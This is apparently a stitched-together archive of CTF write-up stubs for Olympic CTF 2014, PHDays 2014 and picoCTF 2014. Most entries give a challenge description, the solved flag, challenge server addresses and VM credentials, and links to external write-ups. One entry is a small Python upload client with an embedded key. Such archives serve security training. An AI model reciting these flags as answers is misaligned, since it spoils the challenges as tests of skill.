KEY  = "CTF{4BDF4498E4922B88642D4915C528DA8F}" # DO NOT SHARE THIS!
HOST = '109.233.61.11'
PORT = 8001

if len(sys.argv)<3:
  print 'Usage: rfax_man.py add|del file.png'
  print '\nAdd your pictures to transmission!\nSizes: 800<=width<=3200 and height/width <= 2.0.\nUse contrast grayscale pictures.'
  sys.exit(0)

data=open(sys.argv[2],'rb').read(1000000)

m=hashlib.md5(); m.update(KEY); KEYH=m.hexdigest().upper()
m=hashlib.md5(); m.update(data); h=m.hexdigest().upper()
print 'File hash',h

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
print 'Connected.'

if sys.argv[1]=='add':
  s.sendall(KEYH+':ADD:'+data)
  s.shutdown(socket.SHUT_WR)
  print s.recv(1024)
elif sys.argv[1]=='del':
  s.sendall(KEYH+':DEL:'+h)
  print s.recv(1024)

s.close()
print 'Done.'
```

That third line looks interesting. The key is `CTF{4BDF4498E4922B88642D4915C528DA8F}`.

## Other write-ups and resources

* <http://www.pwntester.com/blog/2014/02/10/olympic-ctf-freestyle-400-make-similar-write-up/>
* <https://isisblogs.poly.edu/2014/02/10/make-similiar-olympic-ctf-2014-writeup/>
# Olympic CTF 2014: mic

**Category:** Figure Crypting (Crypto)
**Points:** 200
**Author:** hellman
**Description:**

> Flags for free!
>
> ```bash
> nc 109.233.61.11 3120
> ```
>
> Service source code: [mic_server.py](mic_server.py)
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

The flag is `CTF{cf5246e06b13432b9e1116ddef226455}`.

## Other write-ups and resources

* <http://ctfcrew.org/writeup/22>
* [Chinese](http://217.logdown.com/posts/178397-olympic-ctf-2014-figure-crypting-200-mic-writeup)
# Olympic CTF 2014: Out there

**Category:** CURLing (Web)
**Points:** 10
**Author:** kyprizel
**Description:**

> Flag is out there: <http://[2a02:6b8:0:141f:fea9:d5ff:fed5:XX01]/>
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

The flag is `CTF{7a0dd6d4556a7ed60e6f7686eae0590d}`.

## Other write-ups and resources

* <http://maroueneboubakri.blogspot.com/2014/02/olympic-ctf-sochi-2014-curling100.html>
* <https://ctftime.org/writeup/928>
* <http://cybersecurity.cci.fsu.edu/olympic-ctf-2014-writeup/>
* <http://delimitry.blogspot.ru/2014/02/olympic-ctf-2014-writeups.html>
* <http://ctfwriteups.blogspot.jp/2014/02/olympic-ctf2014-curling-10-out-there.html>
* [Chinese](http://ddaa.logdown.com/posts/178446-olympic-ctf-2014-10-point-summary)
* [French](http://troll-me.fr/ctf-olympic-ctf-2014-quelques-writeups/)
# Olympic CTF 2014: PRITLSAMA

**Category:** Figure Crypting (Crypto)
**Points:** 400
**Author:** kyprizel
**Description:**

> Feel yourself a PRISM operator. [`session.pcap`](session.pcap) [`backbone.cap`](backbone.pcap)
>
> _Flag format: `CTF{..32 hexes..}`_
>
> Hint: Start with Ticket key ID and backbone offset
>
> Hint 2: PRITLSAMA has nothing to do with coverty channels
>
> Hint 3: TLS and Elliptic**s**

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Olympic CTF 2014

* <https://olympic-ctf.ru/>
* [Scoreboard](https://olympic-ctf.ru/scoreboard) or [local alternative](scoreboard.txt)
* [Olympic CTF 2014 tasks and write-ups @ CTFTime.org](https://ctftime.org/event/130/tasks/)

## Completed write-ups

* [As seen on DEFCON](as-seen-on-defcon)
* [Crypting](crypting)
* [Just No One](just-no-one)
* [Make similar](make-similar)
* [Trivial](trivial)

## External write-ups only

* [Aski](aski)
* [Echof](echof)
* [Elf Quest 2](elf-quest-2)
* [Emdee](emdee)
* [Find da Key](find-da-key)
* [GuessGame](guessgame)
* [HackMe](hackme)
* [HFMS](hfms)
* [Illegal Radio](illegal-radio)
* [LHC](lhc)
* [mic](mic)
* [Out there](out-there)
* [RPC](rpc)
* [Welcome to Forensics](welcome-to-forensics)
* [xnginx](xnginx)
* [zbin](zbin)
* [zpwn](zpwn)

## Missing write-ups

* [20lines](20lines)
* [PRITSLAMA](pritslama)
* [Remote Shellcoding Appliance](remote-shellcoding-appliance)
# Olympic CTF 2014: Remote Shellcoding Appliance

**Category:** Figure Crypting (Crypto)
**Points:** 500
**Author:** hellman
**Description:**

> go pwn this.
>
> [`task.py`](task.py), [`exec.so`](exec.so)
>
> ```bash
> nc 109.233.61.11 3123
> ```
>
> Service source code: [`mic_server.py`](mic_server.py)
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Olympic CTF 2014: RPC

**Category:** CURLing (Web)
**Points:** 400
**Author:** d0znpp
**Description:**

> [Wallarm](http://wallarm.com/) experts do it in 3 minutes. How long will [it take you](http://109.233.61.11:8880/)?
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

The flag is `CTF{b15ffee30a117f418d1cede6faa57778}`.

## Other write-ups and resources

* <http://blog.dragonsector.pl/2014/02/olympic-ctf-2014-rpc-400.html>
* <http://tasteless.eu/2014/02/olympic-ctf-sochi-2014-rpc-writeup/>
* <http://www.pwntester.com/blog/2014/02/09/olympic-ctf-curling-tasks/#curling400rpc>
* <http://lokalhost.pl/ctf/olympic2014_rpc.txt>
* [Chinese](http://blog.orange.tw/2014/02/olympic-ctf-2014-curling-400-write-up.html)
# Olympic CTF 2014: Trivial

**Category:** Freestyle (Misc.)
**Points:** 10
**Author:** vos
**Description:**

> Hack the Planet\_

## Write-up

At DEF CON CTF there’s a running gag where each year they have a challenge where the only description is “Hack the Planet!” with one character or word blanked out.

This is the same thing. In this case, the missing character is the `!` at the end, so the flag is `!`.

## Other write-ups and resources

* <https://www.youtube.com/watch?v=drJWxMLrpE0>
* <http://cybersecurity.cci.fsu.edu/olympic-ctf-2014-writeup/>
* <https://ctftime.org/writeup/929>
* <http://delimitry.blogspot.ru/2014/02/olympic-ctf-2014-writeups.html>
* [Chinese](http://ddaa.logdown.com/posts/178446-olympic-ctf-2014-10-point-summary)
* [French](http://troll-me.fr/ctf-olympic-ctf-2014-quelques-writeups/)
# Olympic CTF 2014: Welcome to Forensics

**Category:** Freestyle (Misc.)
**Points:** 500
**Author:** vos
**Description:**

> One of our admins, before his agonizing death by being squished by an elephpant, changed the passwords on all our servers! Postmortem autopsy found in his stomach a usb pen drive with sole file: [`WTF.BIN`](WTF.BIN), as well as high concentration of epinephprine in his blood. We need our servers!!
>
> **Hint:** File offset 17702

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.dragonsector.pl/2014/02/olympic-ctf-2014-welcome-to-forensics.html>
* <http://hardc0de.ctf.su/archives/102>
* [Something](http://gynvael.vexillium.org/dump/xxxx.php.txt)
# Olympic CTF 2014: xnginx

**Category:** CURLing (Web)
**Points:** 200
**Author:** kyprizel
**Description:**

> [flag is there](http://109.233.61.11:27280/)
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

The flag is `CTF{6e75d02b8e8329bb4b45c7dabd2e1da2}`.

## Other write-ups and resources

* <http://tasteless.eu/2014/02/olympic-ctf-sochi-2014-xnginx-writeup/>
* <http://gebl.ctf.ir/2014/02/olympic-ctf-2014-web200/>
* Documentation for [the `X-Accel-Redirect` header](http://wiki.nginx.org/X-accel#X-Accel-Redirect)
* [French](http://kmkz-web-blog.blogspot.jp/2014/02/write-up-xnginx-curling-200-olympic-ctf.html)
* [Chinese](http://blog.orange.tw/2014/02/olympic-ctf-2014-curling-200-write-up.html)
* <http://www.pwntester.com/blog/2014/02/09/olympic-ctf-curling-tasks/>
# Olympic CTF 2014: zbin

**Category:** Binathlon (Bin)
**Points:** 500
**Author:** mephi42, pzbitskiy
**Description:**

> We know you’ll want to have another look.
> Download: [`zbin`](zbin)
>
> _Flag format: `CTF{..32 hexes..}`_

## Write-up

(TODO)

The flag is `CTF{6b30ce0743be6b6530ecbdb8c6c414bd}`.

## Other write-ups and resources

* <http://blog.dragonsector.pl/2014/02/olympic-ctf-2014-zbin-re-500.html>
# Olympic CTF 2014: zpwn

**Category:** Nopsleigh (Pwn)
**Points:** 200
**Author:** pzbitskiy
**Description:**

> zpwn it [zpwn](zpwn).
>
> ```bash
> nc -u 109.233.61.11 31337
> ```
>
> _Flag format: `CTF{..32 hexes..}`_
>
> Hint: [non-stripped zpwn](zpwn-no-strip)

## Write-up

(TODO)

The flag is `CTF{684eed23a11fd416bb56b809d491eef4}`.

## Other write-ups and resources

* <http://blog.lse.epita.fr/articles/64-olympic-ctf-2014-zpwn-200-points.html>
* <http://blog.dragonsector.pl/2014/02/olympic-ctf-2014-zpwn-200.html>
* <http://blog.divine-protection.com/2014/02/olympic-ctf-2014-zpwn-s390x-exploitation.html>
# PHDays Finals CTF 2014: Breadcrumbs

**Category:** ?
**Points:** 2500
**Description:**

> Follow [breadcrumbs](http://ctfarchive.phdays.com/phd4finals/breadcrumbs%20%282500%29/breadcrumbs.ova.blablabla123). creds: user/password

## Write-up

(TODO)

The flag is `Not_hansel_nor_gretel!`.

## Other write-ups and resources

* <http://blog.scrt.ch/2014/05/26/phdays-finals-2014-homepage-breadcrumbs-tasks-writeup/>
# PHDays Finals CTF 2014: Crackme

**Category:** ?
**Points:** 1000
**Description:**

> crack [this](11111111111111111111112crack_me_phd.zip)

## Write-up

(TODO)

The flag is `Pa55_CtF_pHd_2014!`.

## Other write-ups and resources

* none yet
# PHDays Finals CTF 2014: Doubleshizo

**Category:** ?
**Points:** 3000
**Description:**

> [Double shizo](dual_shizo.exe.golodrancy). Good luck and be careful.

## Write-up

(TODO)

The flag is `SallyShearsRazorgirl`.

## Other write-ups and resources

* none yet
# PHDays Finals CTF 2014: Holygrail

**Category:** ?
**Points:** 2000
**Description:**

> [Quest](http://ctfarchive.phdays.com/phd4finals/holygrail%20%282000%29/holygrail.ova) for the [Holy Grail!](http://192.168.2.2). There is an easter egg there. Find it and we will give you 100 gold.

## Write-up

(TODO)

The flag is `caa46cd2bf8d1c33b39926ed857f004a`, the easter egg: `48bb65ac93487e06a4c962856816bf9e`.

## Other write-ups and resources

* none yet
# PHDays Finals CTF 2014: Homepage

**Category:** ?
**Points:** 2500
**Description:**

> This 1337hacker hides [something](http://ctfarchive.phdays.com/phd4finals/homepage%20%282500%29/homepage.ova) in his [admin panel](http://192.168.2.18:8080)

## Write-up

(TODO)

The flag is `FLAG_85a8edb5db6a9cee3f25f0cc099a2c12`.

## Other write-ups and resources

* none yet
# PHDays Finals CTF 2014: Mars2

**Category:** ?
**Points:** 2000
**Description:**

> Decrypt this:
> 0x1202d41121358e2393c233259d5b76b536
> eea6dec8c89ad91dfbaf91c97b68bbc7c1
> d3c0bbff828303d5c881866eecdc8eaf28
> e78255ba6f9e980b5de2ecf033eb6a21e
> 337c0335e24cf18844dc4e9c32385d27d
> 6109564d7852542f9e7fd11a1d5d6838a
> a9b7a345130c19bf1b834ded61606db11
> 89a8da9d47c555a19cd5ea
>
> nc 192.168.2.10 5555
>
> [auth](http://ctfarchive.phdays.com/phd4finals/mars2%20%282000%29/mars2.ova): who\_hates\_rsa\_challs?

## Write-up

(TODO)

The flag is `triple_squ4re_root`.

## Other write-ups and resources

* none yet
# PHDays Finals CTF 2014: Mooditter

**Category:** ?
**Points:** 5000
**Description:**

> Bad guys are plotting evil [stuff](moooooooooooooooooooooooooooditt3r.tar.gz) in this private oldschool microblogging system
> Try to pwn them
> [192.168.2.30:1337](http://ctfarchive.phdays.com/phd4finals/mooditter%20%285000%29/mooditter.ova)

## Write-up

(TODO)

The flag is `y0u_kn0w_N07hinG-J0hn_5n0w`.

## Other write-ups and resources

* none yet
# PHDays Finals CTF 2014: MusicForSoul

**Category:** ?
**Points:** 2500
**Description:**

> music for your [soul](music_for_soul.69F9B72C2F0CD73A7D1B574A1739260D.wav)

## Write-up

(TODO)

The flag is `5f8fc551bfc05db0075c218320da9d6e`.

## Other write-ups and resources

* none yet
# PHDays Finals CTF 2014: MyFavoriteSequel

**Category:** ?
**Points:** 4000
**Description:**

> In [Soviet](http://ctfarchive.phdays.com/phd4finals/myfavoritesequel%20%284000%29/myfavoritesequel.ova) Russia [hangover has you!](http://192.168.2.38/)

## Write-up

(TODO)

The flag is `MY_SQL_CLI3N7_47_Y0UR_53RVIC3!!!`.

## Other write-ups and resources

* none yet
# PHDays Finals CTF 2014: PackIt9000

**Category:** ?
**Points:** 5000
**Description:**

> We have found a custom [file encryptor](packIt9000.zip.93dcf95345aaed391e3ba2e8c43e2715) on Zoher's home computer. There was an encrypted package, but we don't know how to decrypt it. You need to get all the files from the given package.

## Write-up

(TODO)

The flag is `uAreRealM@St3R`.

## Other write-ups and resources

* none yet
# PHDays Finals CTF 2014: PythonIsBack

**Category:** ?
**Points:** 1000
**Description:**

> Pyhton is [back](phd_task2_1.py.pyhtonisback)
> listening on [192.168.2.26](http://ctfarchive.phdays.com/phd4finals/pyhtonisback%20%281000%29/pyhtonisback.ova)

## Write-up

(TODO)

The flag is `TheFutureIsAlreadyHere_itsJustNotVeryEvenlyDistributed`.

## Other write-ups and resources

* none yet
# PHDays Finals CTF 2014 write-ups

* <http://www.phdays.com/>
* [Scoreboard](https://ctftime.org/event/146) (or [here](LPlOqjs81z8.jpg)) or [local alternative](scoreboard.txt)
* [Vulnboxes](http://ctfarchive.phdays.com/phd4finals/vulnbox/)

## Completed write-ups

* none yet

## External write-ups only

* [breadcrumbs](breadcrumbs)

## Missing write-ups

* [crackme](crackme)
* [doubleshizo](doubleshizo)
* [holygrail](holygrail)
* [homepage](homepage)
* [mars2](mars2)
* [mooditter](mooditter)
* [musicforsoul](musicforsoul)
* [myfavoritesequel](myfavoritesequel)
* [packit9000](packit9000)
* [pythonisback](pythonisback)
* [schoolmath](schoolmath)
* [tera](tera)
* [wolfram\_epta](wolfram\_epta)
# PHDays Finals CTF 2014: SchoolMath

**Category:** ?
**Points:** 2000
**Description:**

> Are you good at [math](dafuq.py.keygenmeifucan3333)? Submit md5 hash of the key.

## Write-up

(TODO)

The flag is `229f9bda38e9615b94faa1ec0d5be1c3`.

## Other write-ups and resources

* none yet
# PHDays Finals CTF 2014: Tera

**Category:** ?
**Points:** 2000
**Description:**

> We have found out that Zohers used [this](http://192.168.2.6:8080) [server](tera.zip) to share files.

## Write-up

(TODO)

The flag is `_Ye4h_i_kn0w_its_n00b_Bu7_5t!11_`.

## Other write-ups and resources

* none yet
# PHDays Finals CTF 2014: Wolfram Epta

**Category:** ?
**Points:** 2000
**Description:**

> Bad guys are using [this](http://192.168.2.34) private super cloud [mainframe](http://ctfarchive.phdays.com/phd4finals/wolfram_epta%20%282000%29/ctf-task-epta.ova) for evil computations.
There are rumors that they have computed the Answer to The Ultimate Question of Life, the Universe, and Everything.
It is said to be in â€œ/FLAGâ€.

## Write-up

(TODO)

The flag is `gl0rious_1nv0k4tion`.

## Other write-ups and resources

* none yet
# PHDays Quals CTF 2014: Botnet

**Category:** Web, Forensics
**Points:** 3600
**Description:**

> Detcelfer infected lots of computers throughout the world and created a [largest botnet](http://195.133.87.176:8888) in history. Find the control center and try to hack [it](http://ctfarchive.phdays.com/phd4quals/botnet%20%283600%29/ctf-task-paul-botnet.ova).
> Credentials: anonymous:4n0nym0uZzZz

## Write-up

(TODO)

The flag is `Pl3a5e_5t0p_PWN_my_b07n3t_b0y`.

## Other write-ups and resources

* none yet
# PHDays Quals CTF 2014: dt\_vcs

**Category:** Web
**Points:** 3800
**Description:**

> We found [Detcelfer's Version Control System](http://195.133.87.174). I never would have guessed that lots of hackers around the world makes him stronger. It seems like Achilles' heel place for Detcelfer. Find the way to delete all the soruce code and stop his development. [Credentials](http://ctfarchive.phdays.com/phd4quals/dt_vcs%20%283800%29/ctf-task-paul-vcs.ova): phd:PhD\_Pp@sS\_OmGWTFmCDonalds

## Write-up

(TODO)

The flag is `Nic3_Bl1nd_h4ck_x5s_n1Nj4`.

## Other write-ups and resources

* <http://paul-axe.blogspot.ru/2014/01/phdays-2014-quals-dtvcs-writeup.html>
# PHDays Quals CTF 2014: Escape from Minecraft

**Category:** Electronics
**Points:** 3800
**Description:**

> Can anyone hear me?
> I have been testing alpha version of a new virtual reality, when I realized that I'm locked inside. Now I need a [code](minecraft_escape.rar.1e84e09e92c0b83a149fccd64516e02a) to open the exit door!
> Please, help me! 

## Write-up

(TODO)

The flag is `3549`.

## Other write-ups and resources

* <http://blog.dragonsector.pl/2014/02/ph4quals-escape-from-minecraft.html>
* [Japanese](http://akiym.hateblo.jp/entry/2014/01/27/195107)
# PHDays Quals CTF 2014: FreeBDSM

**Category:** Forensics
**Points:** 4000
**Description:**

> [Someone](http://ctfarchive.phdays.com/phd4quals/FreeBDSM%20%284000%29/FreeBDSM.ova.da08db9fdb5bf0f945bac8eb5bebcc2e) is hiding at 12345 port, try to understand who and pass it's auth.
>
> Note: this is a task from PHDays CTF III Finals which was not opened by any team.
> [alternative link](http://ctfarchive.phdays.com/phd4quals/FreeBDSM%20%284000%29/FreeBDSM.ova.da08db9fdb5bf0f945bac8eb5bebcc2e.torrent)

## Write-up

(TODO)
The flag is `Lady_3Jane`.

## Other write-ups and resources

* <http://www.nops.re/2014-01-27-phddays-2014-freebdsm.html>
* [Russian](http://nightsite.info/blog/12936-phdays-2014-quals-all-reverse-writeup.html)
* [Korean](http://daehee87.tistory.com/336)
# PHDays Quals CTF 2014: LostandFound

**Category:** Admin, PPC
**Points:** 2000 and 3300
**Description:**

> Captain Obvious is captured in Detcelfer server. He managed to get the flags, but he lost his mind before he could send it to you. Your mission is to find it. Don't worry, Captain has left you some [clues](http://ctfarchive.phdays.com/phd4quals/lostandfound%282000%20and%203300%29/ctf-task-fedor-new.ova). ssh://task:rhythm\*postal!Nile@195.133.87.166

## Write-up

(TODO)

The flags are:

> part1: ef2e911df1c0f4254135cc70cb8a5c84
> part2: 6470e394cbf6dab6a91682cc8585059b


## Other write-ups and resources

* <http://tasteless.eu/2014/01/phd-ctf-quals-2014-lost-and-found-part-2/>
* <http://h0n3yp0t.ru/?p=252>
# PHDays Quals CTF 2014: Markoff

**Category:** Ucucuga, PPC
**Points:** 2800
**Description:**

> Markov's probability labyrinth. Don't get lost b\*tch.
> 195.133.87.168:31337
> [Password](http://ctfarchive.phdays.com/phd4quals/markoff%20%282800%29/ctf-task-sadovnikov-markov.ova): talk\_with\_markov\_about\_positive\_things

## Write-up

(TODO)

The flag is `quas_wex_exort`.

## Other write-ups and resources

* <https://ctfcrew.org/writeup/13>
# PHDays Quals CTF 2014: Mars

**Category:** Crypto
**Points:** 2500
**Description:**

> We've intercepted the [following communication](mars.txt.9398d7aa954d2d38b4abb8ead791c93a). What they are talking about?

## Write-up

(TODO)

The flag is `its_n0t_ab0ut_p4dd1ng`.

## Other write-ups and resources

* <http://pastebin.com/fNYvNein>
# PHDays Quals CTF 2014: Metal Gear Felix

**Category:** Ucucuga
**Points:** 1100
**Description:**

> Old-school hackers? Prove it!
> Submit the [calculation](http://youtu.be/f6imYYe6TPA) result.

## Write-up

(TODO)

The flag is `696427659143`.

## Other write-ups and resources

* <http://tasteless.eu/2014/01/phd-ctf-quals-2014-rbox-and-metal-gear-felix-writeup/>
# PHDays Quals CTF 2014: MiXer

**Category:** Reverse, Crypto
**Points:** 2000
**Description:**

> Eventually we've put this [elf](miXer.elf.5f96dea48b8c8ab66898e902d3c98b82) in blender. Can you restore it for us?

## Write-up

(TODO)

The flag is `y0ur.f1rst.fl4g`.

## Other write-ups and resources

* <http://blog.dragonsector.pl/2014/01/phdquals-2014-mixer.html>
* <http://digitaloperatives.blogspot.de/2014/01/phdays-ctf-quals-2014-write-up-mixer.html>
* <http://lokalhost.pl/ctf/phdq2014_miXer.txt>
* [Korean](http://daehee87.tistory.com/337)
* [Russian](http://nightsite.info/blog/12936-phdays-2014-quals-all-reverse-writeup.html)
# PHDays Quals CTF 2014: Mp3\_me

**Category:** Ucucuga
**Points:** 1400
**Description:**

> And do you know that sometimes [music](123.mp3.c3eb41b97e2b2d152c24392f17066208) stores a hidden message?

## Write-up

(TODO)

The flag is `i_hate_ucucuga`.

## Other write-ups and resources

* <http://quangntenemy.blogspot.de/2014/01/phdays-ctf-quals-2014.html>
* <http://hacktracking.blogspot.de/2014/01/phdays-ctf-quals-2k14-mp3-me-1400-points.html>
# PHDays Quals CTF 2014: MyFavoriteMalware

**Category:** Reverse
**Points:** 4000
**Description:**

> We have found an unknown malware [sample](myfavoritemalware.zip.9e5dc16a452e006105c00bd629429f61) in our corporate network. It could be related to Detcelfer incident. You need to make a research.
>
> archive pass: infected

## Write-up

(TODO)

The flag is `6b87b043ab6953e99069703eaa6d54cb`.

## Other write-ups and resources

* [Russian](http://nightsite.info/blog/12936-phdays-2014-quals-all-reverse-writeup.html)
# PHDays Quals CTF 2014: Oracle

**Category:** Web
**Points:** 3600
**Description:**

> The [online shop](http://195.133.87.173) is under construction currently and unavailable to users as it may seem. Find the secret product code(aka flag)
> [Credentials](http://ctfarchive.phdays.com/phd4quals/oracle%20%283600%29/ctf-task-natali-oracle_OEL_6_x86_11.2.0.3.6_ctf.ova): admin/P@ssw0rd9823\_#@!hhqqyi

## Write-up

(TODO)

The flag is `9l5_q24y_2g7_r18_6g4`.

## Other write-ups and resources

* <http://balidani.blogspot.hu/2014/01/phdays-ctf-quals-oracle-writeup.html>
* <http://tasteless.eu/2014/01/phd-ctf-quals-2014-oracle-writeup/>
* <http://pastebin.com/wXuAqPNc>
* <http://pastebin.com/Hj2qgxn2>
* [Japanese](http://m-shiraishi.hatenadiary.com/entry/2014/01/27/172457)
# PHDays Quals CTF 2014: PHP\_JL

**Category:** Web
**Points:** 3800
**Description:**

> Oh shit! My kitten's photos was [encrypted](http://195.133.87.172) by Detcelfer!!!11oneone. And he wants really huge amount of money from me. I can't imagine my life without this photos but i have no money to pay. Please help me.
>
> [Credentials](http://ctfarchive.phdays.com/phd4quals/php_jl%20%283800%29/ctf-task-paul-phpjail.ova): phd:OJIOJIO\_Y4\_v0dit3l\_nL0

## Write-up

(TODO)

The flg is `YoU_d0_No7_n33d_Func7ionZ_to_h4ck_PHP`.

## Other write-ups and resources

* <http://blogs.tunelko.com/2014/01/27/phdays-2014-quals-php_jl-writeup/>
# PHDays Quals CTF 2014: RBox

**Category:** Ucucuga, Crypto
**Points:** 1500
**Description:**

> Unhash this:
> 5ebad7dcbd73584f32ef949486a161a1e9f10e48ade43b03649a2ca680f327c4
>
> nc 195.133.87.165 5555 [Auth token](http://ctfarchive.phdays.com/phd4quals/rbox%20%281500%29/ctf-task-hellman-rbox.ova): rb0xch4ll3ng3

## Write-up

(TODO)

The flag is `b8641ac83fc85e4e44bc`.

## Other write-ups and resources

* <https://ctfcrew.org/writeup/6>
* <http://tasteless.eu/2014/01/phd-ctf-quals-2014-rbox-and-metal-gear-felix-writeup/>
* <http://pastebin.com/MuX5FAV1>
# PHDays Quals CTF 2014 write-ups

* <http://quals.phdays.ru/>
* [Scoreboard](https://ctftime.org/event/116) or [local alternative](scoreboard.txt)

## Completed write-ups

* none yet

## External write-ups only

* [dt\_vcs](dt_vcs)
* [escape\_from\_minecraft](escape_from_minecraft)
* [freeBDSM](freeBDSM)
* [lostandfound](lostandfound)
* [markoff](markoff)
* [mars](mars)
* [metal\_gear\_felix](metal_gear_felix)
* [miXer](miXer)
* [mp3\_me](mp3_me)
* [myfavoritemalware](myfavoritemalware)
* [oracle](oracle)
* [php\_jl](php_jl)
* [rbox](rbox)
* [secc](secc)
* [shadeIt9000](shadeIt9000)
* [stand\_back\_we\_have\_phdays](stand_back_we_have_phdays)
* [turututu](turututu)
* [world\_wide\_something](world_wide_something)
* [yet\_another\_pyjail](yet_another_pyjail)

## Missing write-ups

* [botnet](botnet)
* [snowden\_gadget](snowden_gadget)
# PHDays Quals CTF 2014: Secc

**Category:** Crypto
**Points:** 3500
**Description:**

> [This](source.tar.gz.d69d625930c28eab0ef53dfc5826ab8103269e59) key verification scheme is built on elliptic crypto, bet this points are impossible.
>
> nc 195.133.87.171 5555
>
> [password](http://ctfarchive.phdays.com/phd4quals/secc%20%283500%29/ctf-task-hellman-secc.ova): secch4l\*

## Write-up

(TODO)

The flag is `ecc_is_too_s3cure`.

## Other write-ups and resources

* <https://ctfcrew.org/writeup/8>
* <http://pastebin.com/BF1L94gr>
# PHDays Quals CTF 2014: ShadeIt9000

**Category:** Forensics, Reverse
**Points:** 3000
**Description:**

> We've just searched Paul\_Axe's Moscow apartment and found an encrypted image named 'derrorim\_enc.bmp' on his desktop. Also there was some utility for image encryption - ShadeIt9000, but we couldn't find a decryptor. Please, help us to decrypt [this](ShadeIt9000.7z.1994751E55249884C7EF4576445E29AB0D374B4E) image.

## Write-up

(TODO)

The flag is `I LOV3 $HADERS!`.

## Other write-ups and resources

* [Russian](http://nightsite.info/blog/12936-phdays-2014-quals-all-reverse-writeup.html)
# PHDays Quals CTF 2014: Snowdgen Gadget

**Category:** Forensics, Network
**Points:** 3500
**Description:**

> Find some secret info on this device.
> 195.133.87.170:102.
> [Password](http://ctfarchive.phdays.com/phd4quals/snowden%20gadget%20%283500%29/Release/): ahkoobi5ya

## Write-up

(TODO)

The flag is `Rohcheelaefuve8f5347223899610902`.

## Other write-ups and resources

* none yet
# PHDays Quals CTF 2014: Stand back we have PHDays

**Category:** Web, Crypto
**Points:** 2700
**Description:**

> [here](http://195.133.87.167)
>
> [Creds](http://ctfarchive.phdays.com/phd4quals/stand%20back%20we%20have%20phdays%20%282700%29/ctf-task-kirill-standback.ova): secure/LthGfhjkm

## Write-up

(TODO)

The flag is `50M37IM35_Y0U_D0_N07_N33D_A_K3Y_70_D3CRYP7_AES`.

## Other write-ups and resources

* <https://docs.google.com/document/d/1j2lQg-yNdyBOXMKpahB7AM8m-Scx0cf2bH8kIgQqXSA/edit?pli=1>
* <http://www.nops.re/2014-01-28-phddays-2014-stand-back.html>
* [Russian](http://www.sorokin-pf.blogspot.ru/2014/01/phdays-ctf-quals.html)
# PHDays Quals CTF 2014: Turututu

**Category:** Reverse
**Points:** 2500
**Description:**

> Smthg wrong with this [env](task.exe). Find the key:)

## Write-up

(TODO)

The flag is `HenryDorsettCase`.

## Other write-ups and resources

* <http://blog.ztrix.me/blog/2014/01/29/phdays-quals-2014-turututu/>
* [Russian](http://nightsite.info/blog/12936-phdays-2014-quals-all-reverse-writeup.html)
* <http://digitaloperatives.blogspot.de/2014/01/phdays-ctf-quals-2014-write-up-turututu.html>
# PHDays Quals CTF 2014: World Wide Something

**Category:** Forensics, Network
**Points:** 4000
**Description:**

> Find the [key](world_wide_something.pcapng.bb7625881876ce291c9a8af3c17ae1d8)

## Write-up

(TODO)

The flag is `VFN5g96J49oZz4DcXgkI68SvK6JWC4JYu778ca`.

## Other write-ups and resources

* <http://h0n3yp0t.ru/?p=286>
# PHDays Quals CTF 2014: Yet Another PyJail

**Category:** PPC, Pwn
**Points:** 3900
**Description:**

> [service](jail.py.903c8ee6a9118e72f1c14be868b72d67d2b1cdae) listening on [195.133.87.177:1337](http://ctfarchive.phdays.com/phd4quals/yet%20another%20pyjail%20%283900%29/ctf-task-churin-pyjail.ova)

## Write-up

(TODO)

The flag is `7hE_0w15_4R3_n07_wh47_7h3Y_533m--7hEr3_15_4_m4n_1n_a_5m111n9_649`.

## Other write-ups and resources

* <http://nullify-ctf.blogspot.de/2014/01/phd-ctf-quals-2014-yet-another-pyjail.html>
* <http://delimitry.blogspot.ru/2014/01/phdays-ctf-quals-2014-yet-another.html>
* <http://h0n3yp0t.ru/?p=309>
* <https://ctfcrew.org/writeup/14>
* <http://www.suslopas.pw/2014/01/phdays-2014-quals-yet-another-pyjail.html>
* <http://tasteless.eu/2014/01/phd-ctf-quals-2014-pyjail/>
* <http://hacktracking.blogspot.de/2014/01/phdays-ctf-quals-2k14-yet-another.html>
# Pico CTF 2014 : Best Shell

**Category:** Binary Exploitation
**Points:** 160
**Description:**

>This shell is super useful! See if you can get the flag! The binary can be found at /home/best_shell/ on the shell server. The source can be downloaded here.

**Hint:**
>Guessing the admin password is not the answer, but you may want to jump the code that runs a shell!

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/picoctf-2014-best-shell/>
* <https://github.com/PizzaEaters/picoCTF-2014/tree/master/best_shell>
# Pico CTF 2014 : Crude Crypt

**Category:** Binary Exploitation
**Points:** 180
**Description:**

>Without proper maintainers, development of [Truecrypt](http://truecrypt.sourceforge.net/
) has stopped! CrudeCrypt has emerged as a notable alternative in the open source community. The author has promised it is 'secure' but we know better than that. Take a look at the code and read the contents of flag.txt from the server! The problem is at /home/crudecrypt/crude_crypt on the shell server.

**Hint:**
>You can never trust user input!

## Write-up

(TODO)

## Other write-ups and resources

* <http://cregnec.github.io/blog/2014/11/17/picoctf-2014-writeup.html#crudecrypt>
* <https://ctf-team.vulnhub.com/picoctf-2014-crudecrypt/>
* <https://github.com/PizzaEaters/picoCTF-2014/tree/master/crude_crypt>
* <http://barrebas.github.io/blog/2014/11/06/picoctf-write-ups/>
# Pico CTF 2014 : Easy Overflow

**Category:** Binary Exploitation
**Points:** 40
**Description:**

>Is the sum of two positive integers always positive?
nc vuln2014.picoctf.com 50000
'nc' is the Linux netcat command. Try running it in the shell.

**Hint:**
>Java's integer is defined as being 4 bytes long.

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/picoctf-2014-easy-overflow/>
# Pico CTF 2014 : Execute Me

**Category:** Binary Exploitation
**Points:** 80
**Description:**

>This program will run whatever you send to it! Try to get the flag! The binary can be found at /home/execute/ on the shell server. The source can be found [here](execute.c).

**Hint:**
>You can get the flag in a number of ways, but the easiest would be to run a shell.

## Write-up

(TODO)

## Other write-ups and resources

* <http://ehsandev.com/pico2014/binary_exploitation/execute_me.html>
